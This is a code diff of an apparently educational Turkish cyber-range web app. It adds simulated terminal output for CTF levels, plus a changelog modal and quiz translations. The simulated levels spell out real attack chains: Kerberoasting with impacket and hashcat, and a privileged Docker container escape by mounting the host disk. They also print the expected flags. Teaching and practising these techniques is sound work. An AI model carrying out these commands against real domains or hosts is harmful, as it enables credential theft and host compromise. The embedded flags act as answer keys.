+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">[+] Enumerating users via RPC on 10.10.4.10:\nindex: 0x1042 RID: 0x451 acb: 0x00020210 Account: svc_mssql  Name: SQL Service (SPN: MSSQLSvc/dc01.lfl.corp:1433)\n<span style="color: #fbbf24; font-weight: bold;">[+] SPN hesabı bulundu: svc_mssql! Kerberoast TGS bileti çekmek için: impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request</span></pre>`;
+            }
+            if (cleanCliCmd.includes('getuserspns') || (cleanCliCmd.includes('impacket') && cleanCliCmd.includes('10.10.4.10'))) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">ServicePrincipalName          Name       MemberOf\nMSSQLSvc/dc01.lfl.corp:1433   svc_mssql  CN=Domain Admins,CN=Users,DC=lfl,DC=corp\n\n<span style="color: #fbbf24;">$krb5tgs$23$*svc_mssql$LFL.CORP$MSSQLSvc/dc01.lfl.corp*$8f39a1b20e94c817d450...</span>\n<span style="color: #22c55e;">[+] TGS Hash yakalandı (krb5tgs.hash)! Kırmak için: hashcat -m 13100 krb5tgs.hash rockyou.txt</span></pre>`;
+            }
+            if (cleanCliCmd.includes('hashcat') && cleanCliCmd.includes('13100')) {
+                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">$krb5tgs$23$*svc_mssql$LFL.CORP...: <span style="color: #fbbf24; font-weight: 800;">LFL{level4_1_kerberoast_golden_ticket_ad}</span>\nStatus...........: Cracked\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 4.1 Bayrağı Kırıldı: LFL{level4_1_kerberoast_golden_ticket_ad}</span></pre>`;
+            }
+
+            // CTF Seviye 4.2 (Blue Team SOC & Zeek C2 Threat Hunting)
+            if (cleanCliCmd.includes('zeek-cut') && cleanCliCmd.includes('conn.log')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">10.10.4.25   185.220.101.44   0.042s   [BEACON INTERVAL: 60.0s | 142 connections]\n10.10.4.25   8.8.8.8          0.011s\n<span style="color: #ef4444; font-weight: bold;">[!] C2 BEACONING TESPİT EDİLDİ: 185.220.101.44 (Her 60 saniyede periyodik sinyal)</span></pre>`;
+            }
+            if (cleanCliCmd.includes('suricata') && cleanCliCmd.includes('fast.log')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">11/10/2026-01:14:00.201942  [**] [1:2026991:1] ET MALWARE CobaltStrike C2 DNS Tunneling [**] {TCP} 10.10.4.25:49812 -> 185.220.101.44:443\n<span style="color: #fbbf24;">[+] Zararlı payload dns.log içinde! İncelemek için: grep -i "185.220.101.44" /var/log/zeek/dns.log</span></pre>`;
+            }
+            if (cleanCliCmd.includes('dns.log') && cleanCliCmd.includes('185.220.101.44')) {
+                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">1794180201.44  C9a8b1  10.10.4.25  54112  185.220.101.44  53  TXT  c2_auth_token="<span style="color: #fbbf24; font-weight: 800;">LFL{level4_2_soc_zeek_c2_beacon_avcisi}</span>"\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 4.2 Bayrağı Bulundu: LFL{level4_2_soc_zeek_c2_beacon_avcisi}</span></pre>`;
+            }
+
+            // CTF Seviye 5.1 (Purple Team: Docker Container Breakout)
+            if (cleanCliCmd.includes('capsh') && cleanCliCmd.includes('--print')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Current: = cap_net_raw,<span style="color: #ef4444; font-weight: 800;">cap_sys_admin</span>+ep\nBounding set = cap_chown,cap_dac_override,cap_sys_admin...\n<span style="color: #fbbf24;">[!] KRİTİK: Konteyner --privileged / CAP_SYS_ADMIN ile çalışıyor! Diskleri görmek için: fdisk -l</span></pre>`;
+            }
+            if (cleanCliCmd.includes('fdisk') && cleanCliCmd.includes('-l')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Device       Boot   Start      End  Sectors  Size Id Type\n/dev/sda1    *       2048 83886046 83883999   40G 83 Linux (Host Root Filesystem)\n<span style="color: #22c55e;">[+] Ana sunucu diski (/dev/sda1) bulundu! Bağlamak için: mount /dev/sda1 /mnt/host_root</span></pre>`;
+            }
+            if (cleanCliCmd.includes('mount') && cleanCliCmd.includes('/dev/sda1')) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">[+] /dev/sda1 successfully mounted on /mnt/host_root (rw,relatime)\n<span style="color: #22c55e;">[+] Konteyner izolasyonu aşıldı! Ana sunucu bayrağını okuyun: cat /mnt/host_root/root/purple_flag.txt</span></pre>`;
+            }
+            if (cleanCliCmd.includes('purple_flag.txt')) {
+                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">CONTAINER_ESCAPE_VERIFIED=true\nHOST_NODE=k8s-prod-worker-01\nFLAG=<span style="color: #fbbf24; font-weight: 800;">LFL{level5_1_docker_escape_host_pwned}</span>\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 5.1 Bayrağı Ele Geçirildi: LFL{level5_1_docker_escape_host_pwned}</span></pre>`;
+            }
+
+            // CTF Seviye 5.2 (Grand Final Boss: Kernel Zero-Day & Rootkit Reverse Engineering)
+            if (cleanCliCmd.includes('lsmod') || (cleanCliCmd.includes('dmesg') && cleanCliCmd.includes('shadow'))) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Module                  Size  Used by\n<span style="color: #ef4444; font-weight: 800;">lfl_shadow_rk          45056  0  [HIDDEN_LKM_HOOK_SYSCALL_TABLE]</span>\n[  412.88102] lfl_shadow_rk: sys_getdents64 hooked at 0xffffffffc0412000\n<span style="color: #fbbf24;">[+] Gizli çekirdek modülü tespit edildi! Sembolleri inceleyin: nm /lib/modules/kernel/lfl_shadow_rk.ko</span></pre>`;
+            }
+            if (cleanCliCmd.includes('lfl_shadow_rk.ko') && (cleanCliCmd.includes('nm') || cleanCliCmd.includes('objdump') || cleanCliCmd.includes('radare2') || cleanCliCmd.includes('r2'))) {
+                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">0000000000001040 T decrypt_vault_master_key\n00000000000040a0 D xor_cipher_hex_buf\n  mov rdi, 0x4c464c7b6b65726e ; XOR KEY = 0x5A\n<span style="color: #22c55e;">[+] decrypt_vault_master_key fonksiyonu bulundu! Çekirdek kasasını çözmek için: python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</span></pre>`;
+            }
+            if (cleanCliCmd.includes('python3 -c') || cleanCliCmd.includes('decrypt_vault') || cleanCliCmd.includes('kernel_vault')) {
+                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">===================================================================\n👑 LFL DEFCON-1 KERNEL ZERO-DAY VAULT DECRYPTED 👑\n===================================================================\nROOTKIT_HOOK_REMOVED : sys_getdents64 restored\nMASTER_OMNISCIENT_KEY: <span style="color: #fbbf24; font-weight: 800; font-size: 14px;">LFL{level5_2_kernel_zeroday_omniscient_god_2026}</span>\n===================================================================\n<span style="color: #00e5ff; font-weight: bold;">🏆 TEBRİKLER! 10 SEVİYELİ CTF ARENASININ NİHAİ FİNAL BAYRAĞI ELE GEÇİRİLDİ!</span></pre>`;
             }
 
             // D. SİBER KILAVUZ & SÖZLÜK (85+ Terim Analojili Manpage)
@@ -3099,6 +3577,421 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
     // ==========================================
     // SİBER ROL & TAKIM TESTİ (RED vs BLUE vs PURPLE)
     // ==========================================
+    
+    // ==========================================
+    // LFL PLATFORM CHANGELOG & UPDATE LOG MODAL
+    // ==========================================
+    function bindChangelogModal() {
+        const modal = document.getElementById('changelog-modal');
+        const closeBtn = document.getElementById('btn-close-changelog-modal');
+        const footerCloseBtn = document.getElementById('btn-footer-close-changelog');
+        const topbarBtn = document.getElementById('btn-changelog-toggle');
+        const sidebarBtn = document.getElementById('nav-btn-changelog');
+        const listContainer = document.getElementById('changelog-timeline-list');
+        const searchInput = document.getElementById('changelog-search-input');
+        const filtersContainer = document.getElementById('changelog-filters');
+
+        if (!modal) return;
+
+        const CHANGELOG_DATA = [
+        {
+            version: 'v4.5',
+            date: '10 Kasım 2026',
+            tag: 'MAJOR UPDATE // INTERACTIVE CYBER SUITE',
+            tagClass: 'tag-major',
+            isLatest: true,
+            title: 'Canlı Paket Simülatörü, LFL Sentinel Asistan, Red vs Blue Düello & Sertifika',
+            desc: 'Eğitim odalarına ve ana sayfaya görsel paket yolculuğu simülatörü, akıllı hata yakalayıcı asistan (LFL Sentinel), Web Audio ses efektleri, Speedrun kronometresi, kişisel not defteri (.md) indirici ve mezuniyet sertifikası eklendi.',
+            items: [
+                { type: 'NEW', text: '<strong>Canlı Paket Yolculuğu Simülatörü:</strong> Akademi terminalinde komut çalıştırıldığında paketin istemciden hedef sunucuya gidiş-dönüşünü canlı gösteren ağ şeması eklendi.' },
+                { type: 'NEW', text: '<strong>LFL Sentinel Akıllı Siber Mentor:</strong> Kullanıcının terminalde yaptığı yazım hatalarını veya unuttuğu parametreleri (<code>-c</code>, <code>|</code>, <code>ipconfig</code> vb.) anında tespit edip öğreten asistan eklendi.' },
+                { type: 'NEW', text: '<strong>Günün Siber Görevi & Red vs Blue Düello:</strong> Ana sayfaya günlük seri sayacı olan mini terminal görevi ve canlı saldırılara karşı savunma hamlesi seçilen Red vs Blue düello modu eklendi.' },
+                { type: 'NEW', text: '<strong>Sertifika, Not Defteri İndirici, Ses & Speedrun:</strong> Akademi üst barına tek tıkla yazdırılabilir Başarı Sertifikası, Kişisel Not Defteri (<code>.md</code>) indirici, Web Audio ses efektleri ve Speedrun kronometresi eklendi.' }
+            ]
+        },
+        {
+            version: 'v4.4',
+            date: '10 Kasım 2026',
+            tag: 'MAJOR REDESIGN // YENİ ANA SAYFA MİMARİSİ',
+            tagClass: 'tag-major',
+            isLatest: false,
+            title: 'Ana Sayfa 2.0: Sıfır Karmaşa, Hızlı Seviye Seçici ve Merkezde Starter Track',
+            desc: 'Ana sayfadaki (index.html) kalıntı backend kartları, sahte DEFCON/Kernel telemetri kutuları ve uzun biyografi blokları kaldırılarak sıfırdan gelen kullanıcıyı ilk 5 saniyede aksiyona yönlendiren 5 bölümlü modern yapı kuruldu.',
+            items: [
+                { type: 'NEW', text: '<strong>Yeni Odaklı Hero Alanı:</strong> Teknik jargondan arındırılmış "Siber Güvenliği Yaparak Öğrenin" karşılama alanı ve yumuşak kaydırmalı (smooth scroll) aksiyon butonları eklendi.' },
+                { type: 'NEW', text: '<strong>Hızlı Seviye Yönlendirici (3 Mini Kart):</strong> "Tamamen Sıfırım" (01 Ağ Temelleri), "Temelim Var" (09 Nmap) ve "Doğrudan Tatbikat" (Red/Blue/Purple Dallar) hızlı atlama kartları eklendi.' },
+                { type: 'IMPROVED', text: '<strong>Starter Track & Yetenek Ağacı Merkezde:</strong> 18 Temel Starter Odası ve Red/Blue/Purple uzmanlık dalları sayfanın doğrudan ana omurgası haline getirildi.' },
+                { type: 'SECURITY', text: '<strong>Gerçek İstemci Taraflı Mimari Özeti:</strong> Gerçekte olmayan backend iddiaları (.NET 8, EF SQLite, Kestrel, modprobe) ve kırmızı tatbikat bandı temizlenerek projenin gerçek JavaScript simülasyon gücü öne çıkarıldı.' }
+            ]
+        },
+        {
+            version: 'v4.3',
+            date: '10 Kasım 2026',
+            tag: 'MAJOR UPDATE // ACADEMY 2.0 PEDAGOJİK REHBER',
+            tagClass: 'tag-major',
+            isLatest: false,
+            title: 'Akademi 2.0: Sıfırdan Öğretici Komut Röntgeni, Çıktı Tercümesi & Kavram Rehberi',
+            desc: 'Tüm 69 eğitim odası (özellikle 18 Starter odası) ezberden tamamen arındırılarak sıfırdan başlayan birinin bile her kelimesini anlayacağı 5 aşamalı interaktif öğretici rehberle donatıldı.',
+            items: [
+                { type: 'NEW', text: '<strong>1. Bu Komutu Neden Kullanıyoruz?:</strong> Her odada komutun gerçek hayatta hangi sorunu çözdüğünü ve neden mouse yerine bu komutu kullandığımızı anlatan sade Türkçe mantık kartı eklendi.' },
+                { type: 'NEW', text: '<strong>2. Komutun Kelime Kelime Röntgeni:</strong> Komuttaki her kelimenin ve parametrenin (<code>-tuln</code>, <code>-sV</code>, <code>-c 4</code>, <code>|</code>, <code>chmod 700</code> vb.) tek tek ne işe yaradığını gösteren görsel röntgen tablosu eklendi.' },
+                { type: 'NEW', text: '<strong>3. Terminal Çıktısı Tercümesi:</strong> Komutu çalıştırdıktan sonra ekrana gelen İngilizce teknik satırların (<code>LISTEN</code>, <code>0.0.0.0</code>, <code>eth0</code>, <code>ttl=64</code>, <code>UID=0</code>) satır satır Türkçe açıklaması eklendi.' },
+                { type: 'NEW', text: '<strong>4. Sıfırdan Terimler Sözlüğü & Mini Mantık Testi:</strong> Odadaki yabancı terimleri açıklayan mini sözlük ve ezber yapmadan konuyu anlayıp anlamadığını ölçen 1-tıkla Mini Mantık Kontrolü eklendi.' }
+            ]
+        },
+            {
+                version: "v4.2",
+                date: "10 Kasım 2026",
+                date_en: "November 10, 2026",
+                badge: "CANLI / CTF 2.0",
+                badge_en: "LIVE / CTF 2.0",
+                isLatest: false,
+                title: "CTF Arena 2.0: 10 Kademeli Operasyon, Canlı Görev Zinciri & 6000 XP",
+                title_en: "CTF Arena 2.0: 10-Stage Operations, Live Mission Chain & 6000 XP",
+                items: [
+                    {
+                        cat: "feat",
+                        tag: "CTF 2.0",
+                        tag_en: "CTF 2.0",
+                        text: "<strong>10 Kademeli Siber Operasyon (6000 XP):</strong> CTF Arenası 6 seviyeden 10 kapsamlı operasyona yükseltildi. Seviye 4.1 Active Directory Kerberoasting, Seviye 4.2 SOC Zeek C2 Tehdit Avı, Seviye 5.1 Docker Konteyner Kaçışı ve Seviye 5.2 Kernel Zero-Day & Rootkit Tersine Mühendislik (Grand Final Boss) eklendi.",
+                        text_en: "<strong>10-Stage Cyber Operations (6000 XP):</strong> Expanded CTF Arena from 6 to 10 full operations including Level 4.1 AD Kerberoasting, Level 4.2 SOC Zeek C2 Hunt, Level 5.1 Docker Container Breakout, and Level 5.2 Kernel Zero-Day & Rootkit Reverse Engineering."
+                    },
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>İnteraktif Adım Adım Görev Zinciri & Tek Tıkla Çalıştırma:</strong> Her CTF operasyonuna canlı görev adımları eklendi. Terminalde doğru komutu yazdığınızda adım otomatik olarak ✔ işaretlenir veya <code>⚡ Çalıştır</code> butonuyla anında terminale gönderilebilir.",
+                        text_en: "<strong>Interactive Step-by-Step Mission Checklist & One-Click Execute:</strong> Added live mission step checklists that automatically check off (✔) as you run commands or let you fire commands via <code>⚡ Run</code>."
+                    },
+                    {
+                        cat: "feat",
+                        tag: "Telemetri",
+                        tag_en: "Telemetry",
+                        text: "<strong>Canlı CTF Operasyon HUD & Tek Tıkla Bayrak Teslimi:</strong> Aktif hedef sistem, operasyon sayacı (kronometre), kategori filtreleri ve terminalde bayrak bulunduğunda beliren <code>🚩 Bayrağı Otomatik Teslim Et</code> butonu eklendi.",
+                        text_en: "<strong>Live CTF Telemetry HUD & Auto-Claim Flag Button:</strong> Added 4-card live HUD with operation timer, track filters, and an instant <code>🚩 Auto-Claim Flag</code> button inside terminal output whenever a flag is uncovered."
+                    }
+                ]
+            },
+            {
+                version: "v4.1",
+                date: "10 Kasım 2026",
+                date_en: "November 10, 2026",
+                badge: "STABLE",
+                badge_en: "STABLE",
+                isLatest: false,
+                title: "Bilingual i18n Motoru & Tetikleyici İzolasyonu",
+                title_en: "Bilingual i18n Engine & Trigger Isolation",
+                items: [
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>Tam Çift Dilli (TR / EN) i18n Motoru:</strong> Menüler, 3D kartlar, yetenek ağacı, loglar ve değerlendirme modülü dahil 101 farklı bileşen tek tıkla ve sıfır gecikmeyle İngilizce / Türkçe arasında geçiş yapar.",
+                        text_en: "<strong>Full Bilingual (TR / EN) i18n Engine:</strong> Menus, 3D cards, skill tree, audit logs, and assessment quiz across 101 distinct components translate instantly between Turkish and English with zero latency."
+                    },
+                    {
+                        cat: "fix",
+                        tag: "Düzeltme",
+                        tag_en: "Fix",
+                        text: "<strong>Tetikleyici İzolasyonu & 300ms Debounce Kilidi:</strong> Dil butonunun çift event tetikleyerek dili aynı milisaniyede geri döndürmesini engelleyen donanım seviyesinde debounced durum kilidi uygulandı.",
+                        text_en: "<strong>Trigger Isolation & 300ms Debounce Lock:</strong> Prevented dual event execution loop on the language toggle button with hardware-grade state debounce protection."
+                    },
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>İnteraktif Sistem Güncelleme Günlüğü (Changelog):</strong> Platforma eklenen tüm sürümleri, özellikleri ve adli düzeltmeleri listeleyen, aranabilir ve filtrelenebilir sürüm takip paneli eklendi.",
+                        text_en: "<strong>Interactive System Changelog:</strong> Added a dedicated, searchable, and category-filtered release history panel recording all platform modules and security advancements."
+                    },
+                    {
+                        cat: "fix",
+                        tag: "Optimizasyon",
+                        tag_en: "Perf",
+                        text: "<strong>Dinamik Cache-Busting (?v=4.1):</strong> Tarayıcı önbellek kilitlenmelerini ortadan kaldırmak için tüm script ve stil linkleri v4.1 sürümüne yükseltildi.",
+                        text_en: "<strong>Dynamic Cache-Busting (?v=4.1):</strong> Upgraded all script and style assets to v4.1 query strings to prevent browser cache stale states."
+                    }
+                ]
+            },
+            {
+                version: "v4.0",
+                date: "9 Kasım 2026",
+                date_en: "November 9, 2026",
+                badge: "MİMARİ",
+                badge_en: "ARCHITECTURE",
+                title: "İnteraktif Siber Kariyer & Yetenek Ağacı",
+                title_en: "Interactive Cyber Career & Skill Tree",
+                items: [
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>İnteraktif Skill Tree & Yol Haritası:</strong> Sıfırdan başlayanlar için Kök Starter (18 Oda), Red Team (20 Oda), Blue Team (17 Oda) ve Purple Team (14 Oda) uzmanlaşma dalları ve SVG bağlantı çizgileri eklendi.",
+                        text_en: "<strong>Interactive Skill Tree & Roadmap:</strong> Added Root Starter (18 Rooms), Red Team (20 Rooms), Blue Team (17 Rooms), and Purple Team (14 Rooms) branches with dynamic SVG connector tracks."
+                    },
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>10 Soruluk Kurumsal Siber Rol Belirleme Testi:</strong> Gerçekçi kurumsal senaryolarla kullanıcının avcı, savunucu veya stratejist yeteneğini analiz eden ve özel akademi odasına yönlendiren test motoru.",
+                        text_en: "<strong>10-Question Corporate Cyber Role Quiz:</strong> Real-world scenario assessment measuring offensive hunter, defensive guardian, and strategist affinities with direct track routing."
+                    },
+                    {
+                        cat: "ui",
+                        tag: "Arayüz",
+                        tag_en: "UI",
+                        text: "<strong>Dinamik Skor Grafiği & İlerleme Çubukları:</strong> Test bitiminde her takım için yüzdelik başarı oranları ve doğrudan komut kütüphanesine atlama bağlantıları.",
+                        text_en: "<strong>Dynamic Score Breakdown & Progress Bars:</strong> Percentage breakdowns for each cyber specialization track upon quiz completion with direct CLI library shortcuts."
+                    }
+                ]
+            },
+            {
+                version: "v3.9",
+                date: "8 Kasım 2026",
+                date_en: "November 8, 2026",
+                badge: "KOMUT MOTORU",
+                badge_en: "CLI ENGINE",
+                title: "143+ Kali Komut Motoru & 80+ Terimli Siber Sözlük",
+                title_en: "143+ Kali CLI Engine & 80+ Term Cyber Glossary",
+                items: [
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>143+ Endüstri Standardı Kali CLI Motoru:</strong> Nmap, Gobuster, Wireshark, Suricata, Hydra, Mimikatz, John the Ripper, Volatility araçlarının yerel bellek içi sıfır gecikmeli terminal simülasyonu.",
+                        text_en: "<strong>143+ Industry-Standard Kali CLI Engine:</strong> Zero-latency in-memory terminal simulation of Nmap, Gobuster, Wireshark, Suricata, Hydra, Mimikatz, John, and Volatility."
+                    },
+                    {
+                        cat: "acad",
+                        tag: "Akademi",
+                        tag_en: "Academy",
+                        text: "<strong>Starter Track Genişletmesi (18 Temel Oda):</strong> IP, Port, DNS, TCP/UDP, Linux CLI, chmod, process kill, grep, tcpdump ve etik hackleme ilkelerini baştan sona öğreten temel rota.",
+                        text_en: "<strong>Starter Track Expansion (18 Essential Rooms):</strong> Comprehensive root path teaching IP, Ports, DNS, TCP/UDP, Linux CLI, chmod, ps/kill, grep, tcpdump, and ethical hacking."
+                    },
+                    {
+                        cat: "acad",
+                        tag: "Sözlük",
+                        tag_en: "Glossary",
+                        text: "<strong>Siber Kılavuz & Sözlük (80+ Terim):</strong> EDR bypass, C2 frameworks, HSTS, Kestrel gibi teknik terimlerin günlük hayattan analojilerle basitleştirilmiş açıklamaları.",
+                        text_en: "<strong>Cyber Guide & Glossary (80+ Terms):</strong> Complex technical concepts like EDR bypass, C2 frameworks, HSTS, and Kestrel explained with real-world everyday analogies."
+                    },
+                    {
+                        cat: "acad",
+                        tag: "Akademi",
+                        tag_en: "Academy",
+                        text: "<strong>Toplam 69 Görev Odası:</strong> Starter (18), Red Team (20), Blue Team (17) ve Purple Team (14) odalarıyla sektör standardı laboratuvar ortamı.",
+                        text_en: "<strong>Total 69 Academy Mission Rooms:</strong> Industry-standard cyber range with Starter (18), Red (20), Blue (17), and Purple (14) scenario environments."
+                    }
+                ]
+            },
+            {
+                version: "v3.8",
+                date: "8 Kasım 2026",
+                date_en: "November 8, 2026",
+                badge: "GÜVENLİK",
+                badge_en: "SECURITY",
+                title: "Zero-Trust Savunma Kalkanları & Güvenlik Mimarisi",
+                title_en: "Zero-Trust Defense Shields & Security Architecture",
+                items: [
+                    {
+                        cat: "sec",
+                        tag: "Güvenlik",
+                        tag_en: "Security",
+                        text: "<strong>Zero-Trust & RBAC İzolasyon Simülatörü:</strong> mTLS karşılıklı kimlik doğrulaması ve iç ağda yetkisiz yatay geçiş (lateral movement) engelleme motoru.",
+                        text_en: "<strong>Zero-Trust & RBAC Isolation Simulator:</strong> Mutual TLS authentication and strict prevention of unauthorized internal lateral traversal."
+                    },
+                    {
+                        cat: "sec",
+                        tag: "Güvenlik",
+                        tag_en: "Security",
+                        text: "<strong>WAF & Katı SQLi / XSS Filtresi:</strong> Dinamik sorgular yerine parametrik LINQ bağlama ve katı CSP Script-Whitelist ile tarayıcı seviyesinde tam zırhlama.",
+                        text_en: "<strong>WAF & Rigid SQLi / XSS Defense:</strong> Parameterized LINQ binding instead of string concatenation, reinforced with strict CSP script whitelisting."
+                    },
+                    {
+                        cat: "sec",
+                        tag: "Güvenlik",
+                        tag_en: "Security",
+                        text: "<strong>Brute-Force Rate Limiter & Karantina:</strong> 5 istek/saniye üzerindeki agresif IP'leri otomatik karantina listesine alan kayan pencere algoritması.",
+                        text_en: "<strong>Brute-Force Rate Limiter & Quarantine:</strong> Sliding window token bucket isolating aggressive hosts exceeding 5 req/sec into automated quarantine."
+                    }
+                ]
+            },
+            {
+                version: "v3.0",
+                date: "7 Kasım 2026",
+                date_en: "November 7, 2026",
+                badge: "TEMEL MOTOR",
+                badge_en: "CORE ENGINE",
+                title: "Görsel Çekirdek & Parallax Motoru",
+                title_en: "Visual Core & Parallax Engine",
+                items: [
+                    {
+                        cat: "ui",
+                        tag: "Arayüz",
+                        tag_en: "UI",
+                        text: "<strong>Kali Ejderhası Açılış Animasyonu:</strong> Canvas parçacık simülasyonu, ses efektleri ve dinamik radar tarama grafikleri.",
+                        text_en: "<strong>Kali Dragon Boot Splash Animation:</strong> Canvas particle simulation, terminal audio cues, and dynamic radar telemetry visuals."
+                    },
+                    {
+                        cat: "ui",
+                        tag: "Arayüz",
+                        tag_en: "UI",
+                        text: "<strong>6 Katmanlı 3D Tilt Kartları:</strong> Donanım hızlandırmalı perspektif ve ışık yansıma (glare) efektleriyle zenginleştirilmiş kurumsal mimari sunumu.",
+                        text_en: "<strong>6-Layer 3D Tilt Architecture Cards:</strong> Hardware-accelerated perspective and radial glare effects showcasing defense layers."
+                    },
+                    {
+                        cat: "feat",
+                        tag: "Özellik",
+                        tag_en: "Feature",
+                        text: "<strong>Çoklu Siber Renk Profilleri:</strong> Cyber Midnight, Matrix Green, Red Alert ve Synthwave temaları.",
+                        text_en: "<strong>Multi-Theme Cyber Color Profiles:</strong> Cyber Midnight, Matrix Green, Red Alert, and Synthwave presets."
+                    }
+                ]
+            }
+        ];
+
+        let currentFilter = 'all';
+        let searchQuery = '';
+
+        function renderChangelog() {
+            if (!listContainer) return;
+            const isEn = (window.I18N && window.I18N.currentLang === 'en');
+            const q = searchQuery.toLowerCase().trim();
+
+            let filteredVersions = CHANGELOG_DATA.map(v => {
+                let items = v.items;
+                if (currentFilter !== 'all') {
+                    items = items.filter(it => it.cat === currentFilter);
+                }
+                if (q) {
+                    items = items.filter(it => {
+                        const txt = (isEn ? it.text_en : it.text) || '';
+                        const tag = (isEn ? it.tag_en : it.tag) || '';
+                        return txt.toLowerCase().includes(q) || tag.toLowerCase().includes(q);
+                    });
+                }
+                return { ...v, items };
+            }).filter(v => v.items.length > 0);
+
+            if (filteredVersions.length === 0) {
+                listContainer.innerHTML = `
+                    <div style="text-align: center; padding: 40px 20px; color: #64748b;">
+                        <div style="font-size: 32px; margin-bottom: 12px;">🔍</div>
+                        <div style="font-size: 14px; font-weight: 600; color: #94a3b8;">
+                            ${isEn ? 'No updates found matching your search.' : 'Aramanızla eşleşen güncelleme kaydı bulunamadı.'}
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+
+            listContainer.innerHTML = filteredVersions.map(ver => {
+                const dateText = isEn && ver.date_en ? ver.date_en : ver.date;
+                const badgeText = isEn && ver.badge_en ? ver.badge_en : ver.badge;
+                const titleText = isEn && ver.title_en ? ver.title_en : ver.title;
+
+                return `
+                    <div class="changelog-entry-card ${ver.isLatest ? 'is-latest' : ''}">
+                        <div class="changelog-node-dot"></div>
+                        <div class="changelog-card-inner">
+                            <div class="changelog-entry-header">
+                                <div class="changelog-version-title">
+                                    <span style="color: ${ver.isLatest ? '#10b981' : '#c084fc'};">${ver.version}</span>
+                                    <span>&bull;</span>
+                                    <span>${escapeHtml(titleText)}</span>
+                                    <span class="changelog-tag-pill tag-${ver.isLatest ? 'acad' : 'ui'}">${badgeText}</span>
+                                </div>
+                                <span class="changelog-date-tag">📅 ${dateText}</span>
+                            </div>
+                            <ul class="changelog-items-list">
+                                ${ver.items.map(it => {
+                                    const tagText = isEn && it.tag_en ? it.tag_en : it.tag;
+                                    const itemText = isEn && it.text_en ? it.text_en : it.text;
+                                    return `
+                                        <li class="changelog-item">
+                                            <span class="changelog-tag-pill tag-${it.cat}">${tagText}</span>
+                                            <span>${itemText}</span>
+                                        </li>
+                                    `;
+                                }).join('')}
+                            </ul>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function openModal() {
+            modal.classList.remove('hidden');
+            renderChangelog();
+            if (searchInput) searchInput.focus();
+        }
+
+        function closeModal() {
+            modal.classList.add('hidden');
+        }
+
+        if (topbarBtn) {
+            topbarBtn.onclick = (e) => {
+                if (e) e.preventDefault();
+                openModal();
+            };
+        }
+
+        if (sidebarBtn) {
+            sidebarBtn.onclick = (e) => {
+                if (e) e.preventDefault();
+                openModal();
+            };
+        }
+
+        if (closeBtn) closeBtn.onclick = closeModal;
+        if (footerCloseBtn) footerCloseBtn.onclick = closeModal;
+
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) closeModal();
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
+                closeModal();
+            }
+        });
+
+        if (filtersContainer) {
+            filtersContainer.querySelectorAll('.changelog-filter-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    filtersContainer.querySelectorAll('.changelog-filter-btn').forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    currentFilter = btn.dataset.filter || 'all';
+                    renderChangelog();
+                });
+            });
+        }
+
+        if (searchInput) {
+            searchInput.addEventListener('input', () => {
+                searchQuery = searchInput.value;
+                renderChangelog();
+            });
+        }
+
+        window.addEventListener('languageChanged', () => {
+            if (!modal.classList.contains('hidden')) {
+                renderChangelog();
+            }
+        });
+
+        // Global export
+        window.LFL_CHANGELOG = {
+            open: openModal,
+            close: closeModal,
+            render: renderChangelog,
+            getData: () => CHANGELOG_DATA
+        };
+
+        renderChangelog();
+    }
+
     function bindCyberRoleQuiz() {
         const container = document.getElementById('quiz-main-container');
         const btnRestart = document.getElementById('btn-restart-quiz');
@@ -3107,6 +4000,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
         const quizQuestions = [
             {
                 q: "1. Bir otele gittiğinde oda kapısındaki elektronik kartlı kilidi görünce aklından ilk ne geçer?",
+                q_en: "1. When you see an electronic card lock on a hotel room door, what is your first thought?",
                 options: [
                     { text: "Bu kart okuyucu acaba manyetik bir hileyle kandırılabilir mi veya kilitte gizli bir açık var mıdır?", team: "red", icon: "" },
                     { text: "Umarım kapı zorlandığında içerideki güvenlik paneline ve resepsiyona anında alarm gidiyordur.", team: "blue", icon: "" },
@@ -3115,6 +4009,7 @@ Sunny     2401  0.0  0.3  24520  6820 pts/0    Ss   00:05   0:00 -bash
             },
             {
                 q: "2. Arkadaşlarınla kutu oyunu veya strateji oyunu oynarken hangi taktik seni daha çok eğlendirir?",
+                q_en: "2. When playing strategy or board games with friends, which tactic do you enjoy most?",
                 options: [
